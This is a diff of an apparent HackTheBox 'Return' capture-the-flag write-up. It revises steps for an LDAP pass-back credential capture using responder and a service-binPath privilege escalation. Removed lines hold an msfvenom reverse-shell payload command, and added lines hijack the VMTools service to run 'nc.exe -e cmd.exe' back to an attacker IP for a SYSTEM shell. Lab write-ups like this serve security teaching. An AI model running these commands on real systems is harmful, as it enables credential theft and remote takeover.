@@ -111,11 +111,15 @@ We can perform something called ```LDAP Pass-back``` attack against this printer
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/909ef243-ec00-408a-96d2-848ec437d8e5)
 
-In this attack we can modify this server address to our IP, then we'll get the printer to connect to us instead, which would disclose the credentials. To do this, let's use a simple Netcat listener to test if we can get the printer to connect to us. Since the default port of LDAP is 389, we can use the following command
+In this attack we can modify this server address to our IP, then we'll get the printer to connect to us instead, which would disclose the credentials. 
 
-command:```nc -lvp 389```
+To do this, we will set responder to run on the interface connected to the vpn.
 
-![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a9a8bd17-12c9-4120-9330-6641225a25d3)
+command:```sudo responder -I tun0```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ea4cc4c9-8fe2-4098-945d-b9b1d8e5e028)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/34081969-6a59-43c8-9208-7f7b67bde4a4)
+
 
 Now, lets go back to the webpage and try to update the settings
 
@@ -123,7 +127,7 @@ Now, lets go back to the webpage and try to update the settings
 
 Checking our listener
 
-![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/24c3a85f-51a8-4d3e-b083-86f0db593b77)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/125c9f3b-51e7-474c-bbda-d9d024992009)
 
 We were able to successfully capture the creds hehe😎.
 
@@ -155,28 +159,11 @@ Lets list services running on this server using the ```services``` command
 
 We can see list of services are there. Then we noted the service name “VMTools” and service binary path for lateral usage.
 
-Lets generate an exe payload using msfvenom
+Lets upload ```nc.exe``` to the target's machine
 
-command:```msfvenom -p windows/x64/shell/reverse_tcp lhost=10.10.16.30 lport=4444 -f exe > bankai.exe```
+command:```upload nc.exe```
 
-```
-┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/return]
-└─$ msfvenom -p windows/x64/shell/reverse_tcp lhost=10.10.16.30 lport=4444 -f exe > bankai.exe
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-[-] No arch selected, selecting arch: x64 from the payload
-No encoder specified, outputting raw payload
-Payload size: 510 bytes
-Final size of exe file: 7168 bytes
-                                                                                                                      
-┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/return]
-└─$ ls -l bankai.exe      
--rw-r--r-- 1 bl4ck4non bl4ck4non 7168 Oct 14 15:03 bankai.exe
-```
-Lets upload this to the target's machine
-
-command:```upload bankai.exe```
-
-![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e6ff7717-f152-4c5b-8ff8-1951d013b5fb)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3b7cbfdb-a71d-4723-a8dc-90de7c27cd56)
 
 cool cool,
 
@@ -186,11 +173,39 @@ Now,
 
 commands
 ```
-sc.exe config VMTools binPath="C:\Users\svc-printer\Documents\bankai.exe"
+sc.exe config VMTools binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd.exe 10.10.16.30 1337"
 sc.exe stop VMTools
 sc.exe start VMTools
 ```
 Ensure you set up your netcat listener before starting the service again
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9f0e1e00-edff-47b9-a491-242c38177eb3)
+
+Nice stuff hehe, we spwned a shell as ```nt authority\system```.
+
+That will be all for today
+<br><br>
+[Back To Home](../../index.md)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
